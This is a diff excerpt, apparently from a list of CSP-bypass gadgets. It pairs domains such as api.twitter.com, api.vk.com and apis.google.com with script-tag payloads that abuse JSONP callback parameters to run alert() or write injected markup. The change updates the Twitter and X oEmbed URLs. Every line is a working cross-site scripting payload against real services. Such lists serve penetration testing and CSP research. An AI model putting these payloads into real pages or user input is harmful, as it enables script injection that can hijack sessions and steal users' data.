@@ -28,12 +28,12 @@ api.olark.com	<script src="https://api.olark.com/2.0/visitors/z1nRAdDubyUjGyih01
 api.pinterest.com	<script src="https://api.pinterest.com/v1/urls/count.json?callback=alert&url=x"></script>
 api.stackexchange.com	<script src="https://api.stackexchange.com/2.2/me?callback=alert(1)-"></script>
 api.swiftype.com	<script src="https://api.swiftype.com/api/v1/public/engines/search.json?callback=alert&engine_key=JDuYRnCLSDZzYWgBkoSB"></script>
-api.twitter.com	<script src="https://api.twitter.com/1/statuses/oembed.json?url=https:%2F%2Ftwitter.com%2FMartina%2Fstatus%2F867710263654580226&callback=alert&_=1496363308445"></script>
+api.twitter.com	<script src="https://api.twitter.com/1/statuses/oembed.json?url=https://x.com/jack/status/20&callback=alert"></script>
 api.tumblr.com	<script src="https://api.tumblr.com/v2/blog/zoeappleseed.tumblr.com/posts/photo?tag=seed&offset=0&api_key=msIByDvkVk3gSr360nq2vmTkKIAvW4gNTB2dUYkvIO9NLwyxNy&jsonp=alert"></script>
 api.livechatinc.com	<script src="https://api.livechatinc.com/v3.6/customer/action/get_dynamic_configuration?license_id=x&url=x&channel_type=code&jsonp=alert"></script>
 api.vk.com	<script src="https://api.vk.com/method/wall.get?callback=alert(1337)"></script>
 api.wordpress.org	<script src="https://api.wordpress.org/stats/plugin/1.0/?slug=x&callback=alert"></script>
-api.x.com	<script src="https://api.x.com/1/statuses/oembed.json?url=https:%2F%2Ftwitter.com%2FMartina%2Fstatus%2F867710263654580226&callback=alert&_=1496363308445"></script>
+api.x.com	<script src="https://api.x.com/1/statuses/oembed.json?url=https://x.com/jack/status/20&callback=alert"></script>
 apis.google.com	<iframe id=x src="/%GG"></iframe><script src="https://apis.google.com/complete/search?client=chrome&q=<script>alert(document.domain)</script>&callback=x.contentDocument.write"></script>
 apis.google.com	<script src="https://apis.google.com/complete/search?client=chrome&q=x&callback=alert"></script>
 apis.google.com <script src="https://apis.google.com/js/googleapis.proxy.js?onload=alert"></script>
